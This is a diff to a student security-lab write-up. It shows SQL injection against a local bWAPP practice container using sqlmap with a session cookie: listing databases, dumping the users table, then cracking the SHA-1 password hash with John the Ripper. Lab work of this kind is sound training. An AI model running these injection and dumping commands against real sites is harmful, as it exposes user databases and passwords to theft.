@@ -187,5 +187,39 @@ In the example:
 First, docker pull the bwapp back
 ![bwapp]([./img/bwapp.PNG](https://github.com/sang-ute/INSE-Lab/blob/main/Lab%231/img/bwaap.PNG)), we can go to the (http://localhost:8025/portal.php) page
 Now, download SQLmap
+![Capture](https://github.com/user-attachments/assets/9f22c6d9-edf0-44cf-84a6-c714699317b4)
 
-(Please reach out to the Lab#1/img for picture source)
+Then, we fetch the cookie fromt the website, which will help us for the login 
+![cookie](https://github.com/user-attachments/assets/10b49cda-eeb6-4703-b7ca-4959cdd819fb)
+Then, only then do we go to the sqlmap to use the cookie for the task:
+```
+sqlmap "http://localhost:8025/sqli_2.php?movie=1&action=go" --cookie="PHPSESSID=b33dsn3vocd3ke553id75ohpo6; security_level=0" --dbs
+```
+Then, after sqlmap queries done, we get the results, which is 4 databases:
++bWAPP
++information_schema
++mysql
++performance_schema
+![databases](https://github.com/user-attachments/assets/75678c5b-8e68-49ad-b032-a8cd7d0b3025)
+<br>
+As of now, we can fetch from given tables
+```
+sqlmap "http://localhost:8025/sqli_2.php?movie=1&action=go" --cookie="PHPSESSID=b33dsn3vocd3ke553id75ohpo6; security_level=0" -D bWAPP --tables
+```
+which we will test on table `bwAPP`
+![bwAPPdatabase](https://github.com/user-attachments/assets/858b7834-f82e-458f-aea4-93940c9a528f)
+We retrived 5 categories inside the table, but table `users` seems to have valueable information, so let's try to get info out of it
+```
+ sqlmap "http://localhost:8025/sqli_2.php?movie=1&action=go" --cookie="PHPSESSID=b33dsn3vocd3ke553id75ohpo6; security_level=0" -D bWAPP -T users --dump
+```
+Specifies the value of element `users` inside the tables by `T users` and then `dump` the content of the whole table out
+![tableuserwpwd](https://github.com/user-attachments/assets/7d486172-9bb4-4c0f-a743-2f84f484ab19)
+And Voilà, there's your username and password (encrypted)
+## Using John the ripper to crack the password
+*First, we copy the string of hashes*
+Next, use the John the Ripper, download via wsl
+`sudo apt-get install john`
+Then, we use
+`john --format=raw-sha1 --wordlist="/mnt/d/IT Engineering- Class of 2027/Information Security/Lab#1/answer.txt" "/mnt/d/IT Engineering- Class of 2027/Information Security/Lab#1/hash.txt" `
+![hashed-unhased](https://github.com/user-attachments/assets/ff4ef315-efce-4466-b2d4-ca2e308095ee)
+We can see the password is set to 'bug'
